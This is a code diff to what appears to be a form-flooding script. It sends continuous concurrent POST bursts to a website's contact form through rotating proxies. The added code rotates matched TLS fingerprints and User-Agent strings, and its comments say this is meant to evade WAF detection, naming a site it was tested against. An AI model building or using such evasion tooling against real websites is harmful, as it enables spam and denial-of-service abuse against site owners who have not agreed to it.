@@ -36,6 +36,25 @@ BROWSER_UA = (
     "Chrome/124.0.0.0 Safari/537.36"
 )
 
+# Real, current browser profiles — (curl_cffi impersonate target, matching UA).
+# UA and TLS fingerprint are kept consistent on purpose: a modern TLS handshake
+# paired with a stale/mismatched UA string is itself a detectable signal (tested
+# against metoo-shatkin.com — an old-UA/modern-TLS mismatch wasn't flagged there,
+# but other WAFs do check this, so don't rely on it holding everywhere).
+BROWSER_PROFILES = [
+    ("chrome136", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
+    ("chrome142", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"),
+    ("chrome145", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"),
+    ("chrome146", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"),
+    ("chrome131_android", "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"),
+    ("edge101", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53"),
+    ("safari184", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15"),
+    ("safari184_ios", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1"),
+    ("firefox135", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"),
+    ("firefox144", "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0"),
+    ("firefox147", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0"),
+]
+
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")
 
@@ -162,15 +181,16 @@ def send_one(req_num, cfg, pool):
 
     domain = cfg["url"].split("/")[2]
     label  = proxy if proxy else "direct (own IP)"
+    impersonate, ua = random.choice(BROWSER_PROFILES)
 
     t0 = time.time()
     try:
         r = cf_requests.post(
             cfg["url"],
             multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
-            headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/"},
+            headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
             proxies={"http": proxy, "https": proxy} if proxy else None,
-            impersonate=IMPERSONATE,
+            impersonate=impersonate,
             timeout=25,
         )
         elapsed = time.time() - t0
@@ -515,7 +535,7 @@ def main():
   Unit Tag    : {cfg['unit_tag']}
   Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
   Proxies     : {(str(pool.alive()) + " alive — rotating per request") if pool else "NONE — sending from this machine's own IP"}
-  TLS         : impersonating {IMPERSONATE} (JA3/JA4 fingerprint, not just UA)
+  TLS         : rotating {len(BROWSER_PROFILES)} real browser profiles (TLS+UA matched per request)
   Mode        : Continuous until Ctrl+C
 {B}{'='*66}{W}
 """)
